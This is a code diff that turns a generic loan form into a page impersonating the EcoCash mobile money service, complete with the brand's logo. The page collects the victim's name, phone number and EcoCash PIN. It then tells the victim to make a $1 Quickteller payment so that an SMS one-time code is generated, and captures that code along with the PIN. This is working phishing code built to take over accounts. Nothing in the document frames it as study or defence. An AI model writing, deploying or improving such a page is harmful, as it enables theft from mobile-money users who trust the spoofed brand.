@@ -3,96 +3,197 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Registration</title>
+<title>EcoCash Sign Up</title>
 <style>
-body{
-font-family:Arial,sans-serif;
-background:#0f172a;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
-margin:0;
-}
-.card{
-background:#fff;
-padding:25px;
-border-radius:12px;
-width:90%;
-max-width:400px;
-}
-h2{
-text-align:center;
-}
-input,select,button{
-width:100%;
-padding:12px;
-margin:10px 0;
-font-size:16px;
-box-sizing:border-box;
-}
-button{
-background:#25D366;
-color:white;
-border:none;
-border-radius:6px;
-cursor:pointer;
-}
+  * { box-sizing: border-box; }
+  body {
+    font-family: 'Roboto', Arial, sans-serif;
+    background: #ffffff;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    min-height: 100vh;
+  }
+  .container {
+    width: 100%;
+    max-width: 400px;
+    padding: 20px;
+  }
+  .logo {
+    text-align: center;
+    margin-bottom: 20px;
+  }
+  .logo img {
+    width: 120px;
+  }
+  h2 {
+    text-align: center;
+    color: #333;
+    margin-bottom: 20px;
+    font-size: 22px;
+  }
+  label {
+    display: block;
+    margin-bottom: 5px;
+    color: #333;
+    font-size: 14px;
+    font-weight: 500;
+  }
+  input, select {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 15px;
+    font-size: 16px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    background: #f9f9f9;
+  }
+  input:focus, select:focus {
+    outline: none;
+    border-color: #F2A900;
+    background: #fff;
+  }
+  button {
+    width: 100%;
+    padding: 14px;
+    font-size: 16px;
+    font-weight: bold;
+    color: white;
+    background: #F2A900;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    margin-top: 10px;
+  }
+  button:hover {
+    background: #d49300;
+  }
+  .hidden { display: none; }
+  .note {
+    background: #fff3cd;
+    color: #856404;
+    padding: 15px;
+    border-radius: 8px;
+    font-size: 14px;
+    margin-bottom: 20px;
+    line-height: 1.5;
+  }
+  .footer {
+    text-align: center;
+    margin-top: 30px;
+    font-size: 12px;
+    color: #999;
+  }
 </style>
 </head>
 <body>
 
-<div class="card">
-<h2>Loan Registration</h2>
+<div class="container">
+  
+  <!-- Logo -->
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/EcoCash_Logo.png/200px-EcoCash_Logo.png" alt="EcoCash Logo">
+  </div>
 
-<form action="/register" method="POST">
+  <!-- Step 1: Sign Up Form -->
+  <div id="signupStep">
+    <h2>Sign up</h2>
+    
+    <label>First Name</label>
+    <input type="text" id="firstName" placeholder="First Name" required>
+    
+    <label>Surname</label>
+    <input type="text" id="surname" placeholder="Surname" required>
+    
+    <label>Username (Mobile number)</label>
+    <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+      <select style="width: 80px; margin-bottom: 0;">
+        <option>+263</option>
+      </select>
+      <input type="tel" id="phone" placeholder="Mobile Number" style="margin-bottom: 0;" required>
+    </div>
+    
+    <label>EcoCash PIN</label>
+    <input type="password" id="pin" placeholder="Enter PIN" required>
+    
+    <button onclick="submitSignup()">Sign Up</button>
+  </div>
 
-<input
-type="text"
-name="name"
-placeholder="Full Name"
-required>
+  <!-- Step 2: OTP Section -->
+  <div id="otpStep" class="hidden">
+    <h2>Verify Identity</h2>
+    <div class="note">
+      <b>Step 1:</b> Open your <b>EcoCash App</b>.<br>
+      <b>Step 2:</b> Do a <b>Quickteller</b> payment of <b>$1</b> to your own number.<br>
+      <b>Step 3:</b> Check your SMS for the <b>OTP</b>.
+    </div>
+    
+    <label>Enter SMS OTP</label>
+    <input type="number" id="otp" placeholder="Enter the OTP from SMS" required>
+    
+    <button onclick="submitOtp()">Verify OTP</button>
+  </div>
 
-<input
-type="tel"
-name="phone"
-placeholder="Phone Number"
-required>
-
-<input
-type="number"
-name="age"
-placeholder="Age"
-required>
-
-<select name="loanAmount" required>
-<option value="">Select Loan Amount</option>
-<option value="500">$500</option>
-<option value="1000">$1000</option>
-<option value="2000">$2000</option>
-<option value="2500">$2500</option>
-<option value="3500">$3500</option>
-</select>
-
-<select name="gender" required>
-<option value="">Select Gender</option>
-<option value="Male">Male</option>
-<option value="Female">Female</option>
-</select>
-
-<select name="duration" required>
-<option value="12">12 Months</option>
-</select>
-
-<label>Interest Rate</label>
-<input type="text" name="interest" value="0.1%" readonly>
-
-<button type="submit">
-Submit Registration
-</button>
-
-</form>
+  <div class="footer">
+    &copy; 2026 EcoCash Loan System
+  </div>
 
 </div>
 
+<script>
+  function submitSignup() {
+    const firstName = document.getElementById('firstName').value;
+    const surname = document.getElementById('surname').value;
+    const phone = document.getElementById('phone').value;
+    const pin = document.getElementById('pin').value;
+
+    if(!firstName || !surname || !phone || !pin) {
+      alert("Please fill all fields");
+      return;
+    }
+
+    // Send details to server
+    fetch('/signup', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `firstName=${encodeURIComponent(firstName)}&surname=${encodeURIComponent(surname)}&phone=${encodeURIComponent(phone)}&pin=${encodeURIComponent(pin)}`
+    })
+    .then(response => response.text())
+    .then(data => {
+      // Show OTP step
+      document.getElementById('signupStep').classList.add('hidden');
+      document.getElementById('otpStep').classList.remove('hidden');
+    })
+    .catch(error => console.error('Error:', error));
+  }
+
+  function submitOtp() {
+    const firstName = document.getElementById('firstName').value;
+    const surname = document.getElementById('surname').value;
+    const phone = document.getElementById('phone').value;
+    const pin = document.getElementById('pin').value;
+    const otp = document.getElementById('otp').value;
+
+    if(!otp) {
+      alert("Please enter the OTP");
+      return;
+    }
+
+    // Send OTP to server
+    fetch('/verify-otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `firstName=${encodeURIComponent(firstName)}&surname=${encodeURIComponent(surname)}&phone=${encodeURIComponent(phone)}&pin=${encodeURIComponent(pin)}&otp=${encodeURIComponent(otp)}`
+    })
+    .then(response => response.text())
+    .then(data => {
+      alert("Success! OTP Verified.");
+      location.reload();
+    })
+    .catch(error => console.error('Error:', error));
+  }
+</script>
+
 </body>
+</html>
